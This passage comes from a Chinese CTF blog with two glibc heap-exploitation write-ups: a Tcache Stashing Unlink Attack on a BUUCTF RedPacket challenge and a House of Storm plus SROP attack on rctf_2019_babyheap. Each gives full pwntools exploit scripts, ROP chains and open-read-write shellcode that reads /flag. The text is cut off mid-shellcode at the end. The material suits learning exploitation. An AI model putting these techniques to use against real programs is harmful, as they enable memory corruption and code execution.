的机制紧密相关。\nHouse of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。\nHouse of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。\n\nTcache Stashing Unlink Attack\n\n利用特性：\n1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中\n2.calloc函数分配堆块时不从tcache bin中选取。\n3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写\n\n利用前提\n1.能控制 Small Bin Chunk 的 bk 指针。2.程序可以越过Tache取Chunk。(使用calloc即可做到)3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。\n例题 BUUCTF-[2020 新春红包题]3\n\n未开启canary保护，可能存在栈溢出\nmain函数\n程序实现四个功能，增，删，查，改，还有一个栈溢出的函数\nvoid __fastcall __noreturn main(char *a1, char **a2, char **a3){  char v3[268]; // [rsp+0h] [rbp-110h] BYREF  int v4; // [rsp+10Ch] [rbp-4h]  v4 = 0;  sub_11D5();  sub_1450();  sub_1269();  while ( 1 )  {    while ( 1 )    {      while ( 1 )      {        menu();        v4 = readd();        if ( v4 != 3 )          break;        a1 = v3;        edit(v3, a2);      }      if ( v4 &gt; 3 )        break;      if ( v4 == 1 )      {        if ( x1c &lt;= 0 )          exitt();        a1 = v3;        add(v3);        --x1c;      }      else      {        if ( v4 != 2 )          goto LABEL_19;        a1 = v3;        delete(v3);      }    }    if ( v4 == 5 )      exitt();    if ( v4 &lt; 5 )    {      a1 = v3;      show(v3);    }    else    {      if ( v4 != 666 )LABEL_19:        exitt();      stack_attack(a1, a2);    }  }}\nadd函数\n申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。\nint __fastcall sub_1515(__int64 a1){  int v2; // [rsp+10h] [rbp-20h]  int v3; // [rsp+14h] [rbp-1Ch]  unsigned int v4; // [rsp+18h] [rbp-18h]  int size; // [rsp+1Ch] [rbp-14h]  printf(\"Please input the red packet idx: \");  v4 = readd();  if ( v4 &gt; 0x10 )    exitt();  printf(\"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): \");  v3 = readd();  if ( v3 == 2 )  {    size = 0xF0;  }  else if ( v3 &gt; 2 )  {    if ( v3 == 3 )    {      size = 0x300;    }    else    {      if ( v3 != 4 )        goto LABEL_14;      size = 0x400;    }  }  else  {    if ( v3 != 1 )    {LABEL_14:      size = 0;      goto LABEL_15;    }    size = 16;  }LABEL_15:  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )    exitt();  *(16LL * v4 + a1) = calloc(1uLL, size);  *(a1 + 16LL * v4 + 8) = size;  printf(\"Please input content: \");  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));  if ( v2 &lt;= 0 )    exitt();  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;  return puts(\"Done!\");}\ndelete函数\n存在UAF\nint __fastcall delete(__int64 a1){  unsigned int v2; // [rsp+1Ch] [rbp-4h]  printf(\"Please input the red packet idx: \");  v2 = readd();  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )    exitt();  free(*(16LL * v2 + a1));                      // uaf                                                //   return puts(\"Done!\");}\nedit函数\n编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次\nint __fastcall sub_1740(__int64 a1, __int64 a2){  void *v2; // rsi  int v4; // [rsp+18h] [rbp-8h]  unsigned int v5; // [rsp+1Ch] [rbp-4h]  if ( qword_4010 &lt;= 0 )    exitt(a1, a2);  --qword_4010;  printf(\"Please input the red packet idx: \");  v5 = readd();  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )    exitt(\"Please input the red packet idx: \", a2);  printf(\"Please input content: \");  v2 = *(16LL * v5 + a1);  v4 = read(0, v2, *(16LL * v5 + a1 + 8));  if ( v4 &lt;= 0 )    exitt(0LL, v2);  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;  return puts(\"Done!\");}\n\nshow函数\nint __fastcall sub_184E(__int64 a1){  unsigned int v2; // [rsp+1Ch] [rbp-4h]  printf(\"Please input the red packet idx: \");  v2 = readd();  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )    exitt();  puts(*(16LL * v2 + a1));  return puts(\"Done!\");}\n栈溢出函数\n执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。\nssize_t sub_13BD(){  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )    exitt();  puts(\"You get red packet!\");  printf(\"What do you want to say?\");  return read(0, buf, 0x90uLL);}\n思路\n因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。\n调试过程\n先把前面的写好\n# coding=utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug') sh = process('./RedPacket_SoEasyPwn1')#sh = remote('node4.buuoj.cn','27283')libc=ELF(\"./libc-2.29.so\")  s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause() def add(index,chunk_size_index,value):    ru('Your input: ')    sl('1')    ru('Please input the red packet idx: ')    sl(str(index))    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')    sl(str(chunk_size_index))    ru('Please input content: ')    sl(value)def free(index):    ru('Your input: ')    sl('2')    ru('Please input the red packet idx: ')    sl(str(index))def edit(index,value):    ru('Your input: ')    sl('3')    ru('Please input the red packet idx: ')    sl(str(index))    ru('Please input content: ')    sl(value)def show(index):    ru('Your input: ')    sl('4')    ru('Please input the red packet idx: ')    sl(str(index))\n构造tcache bin\n首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个\n#1.0x10 2.0xf0 3.0x300 4.0x400for i in range(7):    add(15,4,'Chunk_15')    free(15)for i in range(6):    add(14,2,'Chunk_14')    free(14)dbg()\n\n此时我们利用UAF可以泄露出heap地址\nshow(15)last_chunk_addr = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00'))lg('last_chunk_addr',last_chunk_addr)heap_addr = last_chunk_addr - 0x26C0lg('heap_addr',heap_addr)dbg()\n\n利用unsorted bin构造两个small bin chunk\n\n当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，\n而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。\n\n我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。\n申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。\nadd(1,4,'Chunk_1')add(13,3,'Chunk_13')dbg()\n\n我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址\nfree(1)show(1)libc_base = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00')) - 0x1E4CA0lg('libc_base',libc_base)dbg()\n\n申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100\nadd(13,3,'Chunk_13')dbg()\n\n在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk\nadd(13,3,'Chunk_13')dbg()\n\n利用同样方法再构造一个small bin chunk\nadd(2,4,'Chunk_2')add(13,4,'Chunk_13')#dbg()free(2)#dbg()add(13,3,'Chunk_13')add(13,3,'Chunk_13')dbg()\n\n并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0\n修改small bin chunk的bk指针为first_chunk+0x800\npayload='\\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)edit(2,payload)dbg()\n\n再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.\n\n构造ORW的ROP链放入堆块中\n先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40\npop_rdi_ret = libc_base + 0x0000000000026542pop_rsi_ret = libc_base + 0x0000000000026f9epop_rdx_ret = libc_base + 0x000000000012bda6file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容ROP_chain  = '/flag\\x00\\x00\\x00'\nopen(file_name_addr,0)\nROP_chain += p64(pop_rdi_ret)ROP_chain += p64(file_name_addr)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(0)ROP_chain += p64(libc_base+libc.symbols['open'])\nread(3,flag_addr,0x40)\nRead函数的第一个参数文件描述符从0开始累加，\n程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，\n这样在程序中，每打开一个文件，文件描述符值从3开始累加。\n我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件\nread函数第一个参数是3，就是在这个文件里读取数据。\nROP_chain += p64(pop_rdi_ret)ROP_chain += p64(3)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['read'])\nwrite(1,flag_addr,0x40)\nROP_chain += p64(pop_rdi_ret)ROP_chain += p64(1)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['write'])\n申请chunk，将ROP链写到chunk里\nadd(4,4,ROP_chain)dbg()\n\n栈迁移\n利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。\nleave_ret = libc_base + 0x0000000000058373ru('Your input: ')sl('666')ru('What do you want to say?')#栈迁移sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))itr()\nexp\n# coding=utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug') sh = process('./RedPacket_SoEasyPwn1')#sh = remote('node4.buuoj.cn','27283')libc=ELF(\"./libc-2.29.so\")  s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause() def add(index,chunk_size_index,value):    ru('Your input: ')    sl('1')    ru('Please input the red packet idx: ')    sl(str(index))    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')    sl(str(chunk_size_index))    ru('Please input content: ')    sl(value)def free(index):    ru('Your input: ')    sl('2')    ru('Please input the red packet idx: ')    sl(str(index))def edit(index,value):    ru('Your input: ')    sl('3')    ru('Please input the red packet idx: ')    sl(str(index))    ru('Please input content: ')    sl(value)def show(index):    ru('Your input: ')    sl('4')    ru('Please input the red packet idx: ')    sl(str(index)) #1.0x10 2.0xf0 3.0x300 4.0x400for i in range(7):    add(15,4,'Chunk_15')    free(15)for i in range(6):    add(14,2,'Chunk_14')    free(14)#dbg()show(15)last_chunk_addr = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00'))lg('last_chunk_addr',last_chunk_addr)heap_addr = last_chunk_addr - 0x26C0lg('heap_addr',heap_addr)#dbg()add(1,4,'Chunk_1')add(13,3,'Chunk_13')#dbg()free(1)show(1)libc_base = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00')) - 0x1E4CA0lg('libc_base',libc_base)#dbg()#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100add(13,3,'Chunk_13')#dbg()#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunkadd(13,3,'Chunk_13')#dbg()#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunkadd(2,4,'Chunk_2')#申请一个chunk防止合并add(13,4,'Chunk_13')#dbg()free(2)#dbg()add(13,3,'Chunk_13')add(13,3,'Chunk_13')#dbg()payload='\\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)edit(2,payload)#dbg()add(3,2,'Chunk_3')lg('heap_addr',heap_addr)#dbg()#ORWpop_rdi_ret = libc_base + 0x0000000000026542pop_rsi_ret = libc_base + 0x0000000000026f9epop_rdx_ret = libc_base + 0x000000000012bda6file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容ROP_chain  = '/flag\\x00\\x00\\x00'#open(file_name_addr,0)ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(file_name_addr)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(0)ROP_chain += p64(libc_base+libc.symbols['open'])#read(3,flag_addr,0x40)#Read函数的第一个参数文件描述符从0开始累加，#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，#这样在程序中，每打开一个文件，文件描述符值从3开始累加。#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件#read函数第一个参数是3，就是在这个文件里读取数据。ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(3)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['read'])#write(1,flag_addr,0x40)ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(1)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['write'])add(4,4,ROP_chain)#dbg()leave_ret = libc_base + 0x0000000000058373ru('Your input: ')sl('666')ru('What do you want to say?')#栈迁移sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))#dbg()itr()","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Storm + 堆SROP + orw","url":"/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/","content":"同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，\n若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。\n例题\nrctf_2019_babyheap\n\n\n保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。\n看一下ida\nmain函数\n可以看到是实现了四个功能，增改删查\nint __cdecl main(int argc, const char **argv, const char **envp){  init(argc, argv, envp);  while ( 1 )  {    menu();    switch ( get_int() )    {      case 1:        add();        break;      case 2:        edit();        break;      case 3:        delete();        break;      case 4:        show();        break;      case 5:        puts(\"See you next time!\");        exit(0);      default:        puts(\"Invalid choice!\");        break;    }  }}\nadd函数\n可以申请最大0x1000大小的chunk，最多申请16个chunk\nunsigned __int64 add(){  void **v0; // rbx  int i; // [rsp+0h] [rbp-20h]  int size; // [rsp+4h] [rbp-1Ch]  unsigned __int64 v4; // [rsp+8h] [rbp-18h]  v4 = __readfsqword(0x28u);  for ( i = 0; *(ptrs + 2 * i) &amp;&amp; i &lt;= 15; ++i )    ;  if ( i == 16 )  {    puts(\"You can't\");    exit(-1);  }  printf(\"Size: \");  size = get_int();  if ( size &lt;= 0 || size &gt; 0x1000 )  {    puts(\"Invalid size :(\");  }  else  {    *(ptrs + 4 * i + 2) = size;    v0 = (ptrs + 16 * i);    *v0 = calloc(size, 1uLL);    puts(\"Add success :)\");  }  return __readfsqword(0x28u) ^ v4;}\nedit函数\n存在off-by-null漏洞\nunsigned __int64 edit(){  unsigned int v1; // [rsp+0h] [rbp-10h]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(\"Index: \");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )  {    printf(\"Content: \");    *(*(ptrs + 2 * v1) + read_n(*(ptrs + 2 * v1), *(ptrs + 4 * v1 + 2))) = 0; //off-by-one    puts(\"Edit success :)\");  }  else  {    puts(\"Invalid index :(\");  }  return __readfsqword(0x28u) ^ v2;}\ndelete函数\nunsigned __int64 delete(){  unsigned int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(\"Index: \");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )  {    free(*(ptrs + 2 * v1));    *(ptrs + 2 * v1) = 0LL;    *(ptrs + 4 * v1 + 2) = 0;    puts(\"Delete success :)\");  }  else  {    puts(\"Invalid index :(\");  }  return __readfsqword(0x28u) ^ v2;}\nshow函数\nunsigned __int64 show(){  unsigned int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(\"Index: \");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )    puts(*(ptrs + 2 * v1));  else    puts(\"Invalid index :(\");  return __readfsqword(0x28u) ^ v2;}\n思路\n看了大佬的博客rctf_2019_babyheap，这里对其进行详细的解析。\n程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。\n调试过程\n先把前面的写好\n# coding=utf-8from pwn import *#sh = remote(\"node4.buuoj.cn\", 29278)sh = process('./rctf_2019_babyheap')context(log_level = 'debug', arch = 'amd64', os = 'linux')elf = ELF(\"./rctf_2019_babyheap\")libc = ELF('../../libc-2.23.so--64')def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims   :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data)) def add(size):\tru(\"Choice: \\n\")\tsl('1')\tru(\"Size: \")\tsl(str(size))def free(index):\tru(\"Choice: \\n\")\tsl('3')\tru(\"Index: \")\tsl(str(index))def show(index):\tru(\"Choice: \\n\")\tsl('4')\tru(\"Index: \")\tsl(str(index))def edit(index, content):\tru(\"Choice: \\n\")\tsl('2')\tru(\"Index: \")\tsl(str(index))\tru(\"Content: \")\ts(content)\n首先构造堆块重叠，泄露libc基地址\n先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,\nchunk_3是为了free前三个chunk后防止堆块合并\nadd(0x80)#0add(0x68)#1add(0xf0)#2add(0x18)#3dbg()\n\n之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。\nfree(0)payload = 'a'*0x60 + p64(0x100)edit(1, payload)dbg()\n\nfree chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。\nfree(2)dbg()\n\n\n此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。\nadd(0x80)#0show(1)malloc_hook = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10libc.address = malloc_hook - libc.sym['__malloc_hook']system = libc.sym['system']free_hook = libc.sym['__free_hook']set_context = libc.symbols['setcontext']lg('libc_base',libc.address)dbg()\n\n构造unsortbin chunk 和largebin chunk，进行 house of strom\n先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章House of storm\n此时我们已以可以修改free_hook处的值了\n#---------------布置chunk-------------------------#add(0x18)#4add(0x508)#5add(0x18)#6add(0x18)#7add(0x508)#8add(0x18)#9add(0x18)#10#dbg()#----------------准备 unsorted chunk-----------------------#\tedit(5, 'a'*0x4f0+p64(0x500))#dbg()free(5)edit(4, 'a'*0x18)#dbg()add(0x18)#5add(0x4d8)#11free(5)free(6)#dbg()add(0x30)#5add(0x4e8)#6#dbg()#-------------------准备 large chunk-----------------------------------#edit(8, 'a'*0x4f0+p64(0x500))free(8)edit(7, 'a'*0x18)add(0x18)#8add(0x4d8)#12free(8)free(9)add(0x40)#8#---------------unsorted chunk 和 large chunk 放到对应位置----------------------##dbg()free(6)#dbg()add(0x4e8)#6#dbg()free(6)#dbg()#pause()#--------------修改他们的满足条件进行 house of strom------------------------------#storage = free_hookfake_chunk = storage - 0x20payload = '\\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(11, payload)#dbg()payload = '\\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)edit(12, payload)#dbg()add(0x48)#6\nmprotect+shellcode\n修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,\nsetcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。\nnew_addr =  free_hook &amp;0xFFFFFFFFFFFFF000shellcode1 = '''xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi''' % new_addredit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))\n\n修改前\n修改后\nSROP\n我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到\nfree_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。\nframe = SigreturnFrame()frame.rsp = free_hook+0x10frame.rdi = new_addrframe.rsi = 0x1000frame.rdx = 7frame.rip = libc.sym['mprotect']edit(12, str(frame))free(12)\n\nORW\n利用orw构造shellcode，发送过去并执行，获得shell\nshellcode2 = '''mov rax, 0x67616c662f ;// /flagpush raxmov rdi, rsp ;// /flagmov rsi, 0 ;// O_RDONLYxor rdx, rdx ;mov rax, 2 ;// SYS_opensyscallmov rdi, rax ;// fd mov rsi,rsp  ;mov rdx, 1024 ;// nbytesmov rax,0 ;// SYS_readsyscallmov rdi, 1 ;// fd mov rsi, rsp ;// bufmov rdx, rax ;// count mov rax, 1 ;// SYS_writesyscallmov rdi, 0 ;// error_codemov rax, 60syscall'''sl(asm(shellcode2))itr()\n\nexp\n# coding=utf-8from pwn import *#sh = remote(\"node4.buuoj.cn\", 29278)sh = process('./rctf_2019_babyheap')context(log_level = 'debug', arch = 'amd64', os = 'linux')elf = ELF(\"./rctf_2019_babyheap\")libc = ELF('../../libc-2.23.so--64')def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims   :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data)) def add(size):\tru(\"Choice: \\n\")\tsl('1')\tru(\"Size: \")\tsl(str(size))def free(index):\tru(\"Choice: \\n\")\tsl('3')\tru(\"Index: \")\tsl(str(index))def show(index):\tru(\"Choice: \\n\")\tsl('4')\tru(\"Index: \")\tsl(str(index))def edit(index, content):\tru(\"Choice: \\n\")\tsl('2')\tru(\"Index: \")\tsl(str(index))\tru(\"Content: \")\ts(content)def pwn(): \tadd(0x80)#0\tadd(0x68)#1\tadd(0xf0)#2\tadd(0x18)#3\t\t#dbg()\tfree(0)\tpayload = 'a'*0x60 + p64(0x100)\tedit(1, payload)\t\t#dbg()\t\tfree(2)\t#dbg()\tadd(0x80)#0\tshow(1)\tmalloc_hook = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10\tlibc.address = malloc_hook - libc.sym['__malloc_hook']\tsystem = libc.sym['system']\tfree_hook = libc.sym['__free_hook']\tset_context = libc.symbols['setcontext']\tlg('libc_base',libc.address)\t\t#dbg()\t\tadd(0x160)#2\t#dbg()\t#---------------布置chunk-------------------------#\tadd(0x18)#4\tadd(0x508)#5\tadd(0x18)#6\tadd(0x18)#7\tadd(0x508)#8\tadd(0x18)#9\tadd(0x18)#10\t#dbg()\t#----------------准备 unsorted chunk-----------------------#\t\tedit(5, 'a'*0x4f0+p64(0x500))\t#dbg()\tfree(5)\tedit(4, 'a'*0x18)\t\t#dbg()\tadd(0x18)#5\tadd(0x4d8)#11\tfree(5)\tfree(6)\t\t#dbg()\t\tadd(0x30)#5\tadd(0x4e8)#6\t\t#dbg()\t\t#-------------------准备 large chunk-----------------------------------#\tedit(8, 'a'*0x4f0+p64(0x500))\tfree(8)\tedit(7, 'a'*0x18)\tadd(0x18)#8\tadd(0x4d8)#12\tfree(8)\tfree(9)\tadd(0x40)#8\t#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#\t\t#dbg()\t\tfree(6)\t\t#dbg()\t\tadd(0x4e8)#6\t\t#dbg()\t\tfree(6)\t#dbg()\t#pause()\t#--------------修改他们的满足条件进行 house of strom------------------------------#\tstorage = free_hook\tfake_chunk = storage - 0x20\tpayload = '\\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)\tedit(11, payload)\t#dbg()\tpayload = '\\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)\tedit(12, payload)\t#dbg()\tadd(0x48)#6\t\t#dbg()\tnew_addr =  free_hook &amp;0xFFFFFFFFFFFFF000\tshellcode1 = '''\txor rdi,rdi\tmov rsi,%d\tmov edx,0x1000\tmov eax,0\tsyscall\tjmp rsi\t''' % new_addr\tedit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))\t#dbg()\tframe = SigreturnFrame()\tframe.rsp = free_hook+0x10\tframe.rdi = new_addr\tframe.rsi = 0x1000\tframe.rdx = 7\tframe.rip = libc.sym['mprotect']\tedit(12, str(frame))\tfree(12)\t#dbg() \tshellcode2 = '''\tmov rax, 0x67616c662f ;// /flag\tpush rax\tmov rdi, rsp ;// /flag\tmov rsi, 0 